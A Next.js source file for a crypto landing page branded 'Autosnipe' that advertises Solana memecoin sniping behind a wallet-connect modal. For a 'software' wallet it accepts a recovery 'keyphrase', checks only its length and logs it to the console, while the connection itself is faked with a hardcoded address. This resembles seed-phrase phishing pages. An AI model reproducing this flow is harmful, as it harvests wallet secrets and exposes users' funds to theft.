"use client";
import Image from "next/image";
import { useState, Component } from "react";
import { IoWallet } from "react-icons/io5";
import WalletModal from '@/components/connectModal';
import GetStarted from "@/components/getstarted";
import MemeCoins from "@/app/memes";

// Error Boundary Component
class ErrorBoundary extends Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false, error: null };
  }

  static getDerivedStateFromError(error) {
    return { hasError: true, error };
  }

  componentDidCatch(error, errorInfo) {
    console.error("Component Error:", error, errorInfo);
  }

  render() {
    if (this.state.hasError) {
      return (
        <div className="w-full p-4 bg-red-900/20 rounded-lg border border-red-500 text-red-100">
          <h3 className="font-bold text-lg mb-2">Something went wrong</h3>
          <p className="mb-4">{this.state.error.message}</p>
          <button
            onClick={() => this.setState({ hasError: false })}
            className="bg-red-600 hover:bg-red-700 px-4 py-2 rounded"
          >
            Try Again
          </button>
        </div>
      );
    }
    return this.props.children;
  }
}

// Safe Components with Error Boundaries
const SafeMemeCoins = () => (
  <ErrorBoundary>
    <MemeCoins />
  </ErrorBoundary>
);

const SafeWalletModal = ({ isOpen, onClose }) => (
  <ErrorBoundary>
    <WalletModal isOpen={isOpen} onClose={onClose} />
  </ErrorBoundary>
);

const SafeGetStarted = () => (
  <ErrorBoundary>
    <GetStarted />
  </ErrorBoundary>
);

export default function Home() {
  const [modalOpen, setModalOpen] = useState(false);
  const [connectedWallet, setConnectedWallet] = useState(null);
  const [walletAddress, setWalletAddress] = useState('');
  const [isWalletModalOpen, setIsWalletModalOpen] = useState(false);
  const [connectionError, setConnectionError] = useState(null);

  const handleConnect = async (walletId, keyphrase = null) => {
    try {
      setConnectionError(null);
      
      if (walletId === 'software' && keyphrase) {
        if (!isValidKeyphrase(keyphrase)) {
          throw new Error('Invalid keyphrase format');
        }
        
        console.log('Connecting with keyphrase:', keyphrase);
        setConnectedWallet('software');
        setWalletAddress('0x742d35Cc6634C0532925a3b844Bc454e4438f44e');
      } else {
        await connectWallet(walletId);
        setConnectedWallet(walletId);
        setWalletAddress('0x742d35Cc6634C0532925a3b844Bc454e4438f44e');
      }
    } catch (error) {
      console.error('Wallet connection error:', error);
      setConnectionError(error.message || 'Failed to connect wallet');
      setConnectedWallet(null);
      setWalletAddress('');
    }
  };

  const disconnectWallet = () => {
    try {
      setConnectedWallet(null);
      setWalletAddress('');
      setConnectionError(null);
    } catch (error) {
      console.error('Wallet disconnection error:', error);
      setConnectionError('Failed to disconnect wallet');
    }
  };

  const openWalletModal = () => {
    setIsWalletModalOpen(true);
  };

  const closeWalletModal = () => {
    setIsWalletModalOpen(false);
    setConnectionError(null);
  };

  const isValidKeyphrase = (phrase) => {
    return phrase && phrase.length >= 8;
  };

  const connectWallet = async (walletId) => {
    return new Promise((resolve, reject) => {
      setTimeout(() => {
        if (Math.random() > 0.1) {
          resolve();
        } else {
          reject(new Error('Wallet connection timed out'));
        }
      }, 1000);
    });
  };

  return (
    <ErrorBoundary>
      <section className="w-[full] pt-[1780px] max-[500px]:text-center max-[500px]:pt-[4250px] h-fit text-white flex flex-col items-center justify-center bg-gradient-to-r from-[#012109] via-black to-black ">
        <div className="w-full max-[500px]:w-[350px] pt-10 h-fit flex flex-col gap-[20px] items-center justify-start">
          <h1 className="text-[40px] max-[500px]:text-[30px]">
            Snipe & Sell Solana Tokens at <i className="text-[#00cc33] font-bold">Hyperspeed!</i> 
          </h1>
          <ul className="flex flex-wrap text-[12px] items-start justify-center gap-[20px]">
            <li className="flex flex-row-reverse items-center justify-center gap-[24px]">
              <h2 className="w-20 sm:w-full">ALL SOLANA MEMECOINS</h2>
              <Image
                src="/memecoins_icon.B2QarAeS.avif" 
                alt="Logo"
                className="w-[24px]"
                width={150}
                height={30}
              />
            </li>
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 25" width="18" height="18" className="starIcon__fillHack hidden md:block">
              <path fill="#fff" fillRule="evenodd" d="m12.8 13.38 11.2-.8-11.2-.8L12 .7l-.8 11.08-11.2.8 11.2.8.8 11.07z" clipRule="evenodd"></path>
            </svg>
            <li className="flex flex-row-reverse items-center justify-center gap-[10px]">
              <h2 className="w-24 text-start">DEPOSIT FROM ALL CHAINS</h2>
              <Image
                src="/deposit_icon.76izqal4.avif" 
                alt="Logo"
                className="w-[24px]"
                width={150}
                height={30}
              />
            </li>
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 25" width="18" height="18" className="starIcon__fillHack hidden md:block">
              <path fill="#fff" fillRule="evenodd" d="m12.8 13.38 11.2-.8-11.2-.8L12 .7l-.8 11.08-11.2.8 11.2.8.8 11.07z" clipRule="evenodd"></path>
            </svg>
            <li className="flex flex-row-reverse items-center justify-center gap-[10px]">
              <h2 className="w-24 sm:w-full">DETECT RUGS AUTOMATICALLY</h2>
              <Image
                src="/rug_detection_icon.BXcUJ9kG.avif" 
                alt="Logo"
                className="w-[24px]"
                width={150}
                height={30}
              />
            </li>
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 25" width="18" height="18" className="starIcon__fillHack hidden md:block">
              <path fill="#fff" fillRule="evenodd" d="m12.8 13.38 11.2-.8-11.2-.8L12 .7l-.8 11.08-11.2.8 11.2.8.8 11.07z" clipRule="evenodd"></path>
            </svg>
            <li className="flex flex-row-reverse items-center justify-center gap-[10px]">
              <h2 className="w-24 text-start sm:w-full">MEV PROTECTED TRADING</h2>
              <Image
                src="/mev_protection_icon.0nTkU8lo.avif" 
                alt="Logo"
                className="w-[24px]"
                width={150}
                height={30}
              />
            </li>
          </ul>
          <p className="text-[20px] max-[500px]:text-[15px] text-[grey]">Connect your wallet and start sniping memes now</p>
          <button onClick={openWalletModal} className="flex items-center cursor-pointer bg-[#00cc33] w-[314px] h-[56px] rounded-lg font-semibold text-black text-[19px] justify-center gap-[10px] hover:shadow-[0_0_8px_#ff0000,0_0_8px_#ff00ff,0_0_8px_#0000ff]">
            <IoWallet />Connect & Snipe
          </button>
          {connectionError && (
            <div className="text-red-400 text-sm mt-2">
              {connectionError}
            </div>
          )}
          <p className="text-[13px] text-[grey]">By continuing, you agree to our <span className="text-[white]">Privacy policy</span> and <span className="text-[white]">Terms of Use</span></p>
        </div>
        <section className="w-full flex h-fit pb-[50px] flex-col justify-center gap-5 overflow-hidden sm:flex-row items-center sm:gap-4 pt-[60px]">
          <div className="flex w-[300px] hover:border-[#00cc33] hover:border-1 cursor-pointer gap-[10px] bg-[url('/animated-backgro.png')] bg-cover bg-center p-[13px] rounded-md font-semibold">
            <span className="flex flex-col gap-[10px] items-start justify-center">
              <p>Meme Vision</p>
              <p className="text-[12px] text-[grey]">Find the best meme tokens and track latest migrations</p>
              <button className="w-28 h-fit py-[5px] mr-7 text-xs rounded-full bg-black text-[#00cc33] hover:text-white hover:bg-[#00cc33] shadow-xl">Try Meme Vision</button>
            </span>
            <Image
              src="/memevision.png" 
              alt="Logo"
              className="w-[100px] object-contain"
              width={40}
              height={40}
            />
          </div>
          <div className="flex w-[300px] hover:border-[#00cc33] hover:border-1 gap-[10px] bg-[url('/animated-backgro.png')] bg-cover bg-center p-[13px] rounded-md font-semibold">
            <span className="flex flex-col gap-[10px] items-start justify-center">
              <p>Traders Lens</p>
              <p className="text-[12px] text-[grey]">Find the best meme tokens and track latest migrations</p>
              <button className="w-28 h-fit py-[5px] mr-7 text-xs rounded-full bg-black text-[#00cc33] hover:text-white hover:bg-[#00cc33] shadow-xl">Try Meme Vision</button>
            </span>
            <Image
              src="/bannerman.png" 
              alt="Logo"
              className="w-[100px] object-contain"
              width={40}
              height={40}
            />
          </div>
          <div className="flex w-[300px] hover:border-[#00cc33] hover:border-1 gap-[10px] bg-[url('/animated-backgro.png')] bg-cover bg-center p-[13px] rounded-md font-semibold">
            <span className="flex flex-col gap-[10px] items-start justify-center">
              <p>Earn 40% on fees</p>
              <p className="text-[12px] text-[grey]">Refer your friends now! They get 10% discount on fees</p>
              <button className="w-28 h-fit py-[5px] mr-7 text-xs rounded-full bg-black text-[#00cc33] hover:text-white hover:bg-[#00cc33] shadow-xl">Try Meme Vision</button>
            </span>
            <Image
              src="/trader.png" 
              alt="Logo"
              className="w-[100px] object-contain"
              width={40}
              height={40}
            />
          </div>
        </section>
        <SafeMemeCoins />
        <section className="text-black">
          <SafeWalletModal isOpen={isWalletModalOpen} onClose={closeWalletModal} />
        </section>
        <SafeGetStarted />
        <marquee className="bg-black font-mono py-3 w-[1050px] max-[500px]:w-[400px] border-t-[0.2px] border-b border-gray-600">
          <div className="text-lg">
            <div className="marquee-content flex gap-2">
              <span className="text-[#3E356B]">EXCLUSIVE &amp; INDUSTRY 1ST FEATURES ON AUTOSNIPE</span>
              <span className="text-[#00cc33]">✦</span>
              <span className="text-transparent bg-clip-text bg-gradient-to-r from-[#00cc33] to-white">AI OPTIMISED PRIORITY FEES</span>
              <span className="text-[#00cc33]">✦</span>
              <span className="text-transparent bg-clip-text bg-gradient-to-r from-[#00cc33] to-white">ON-CHAIN RENT REFUND</span>
              <span className="text-[#00cc33]">✦</span>
              <span className="text-transparent bg-clip-text bg-gradient-to-r from-[#00cc33] to-white">AI DETECTION OF POTENTIAL RUG PULL TOKENS</span>
              <span className="text-[#00cc33]">✦</span>
              <span className="text-[#3E356B]">EXCLUSIVE &amp; INDUSTRY 1ST FEATURES ON AUTOSNIPE</span>
            </div>
          </div>
        </marquee>
      </section>
    </ErrorBoundary>
  );
                  }
